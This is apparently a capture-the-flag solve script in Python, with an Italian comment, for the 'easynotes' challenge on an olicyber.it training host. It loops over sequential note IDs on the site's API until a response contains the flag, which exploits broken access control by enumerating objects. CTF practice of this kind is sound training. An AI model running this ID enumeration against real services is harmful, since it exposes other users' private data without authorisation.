import requests, json # girando per il sito si nota che c'è una api...
site = "http://easynotes.challs.olicyber.it/"
s = requests.Session()
s.get(site)
for i in range(int(10e9)):
    r = s.get(site+f"api/note/{i}")
    if "flag" in r.text.lower():
        flag = json.loads(r.text)
        print(flag["content"], end="")
        break
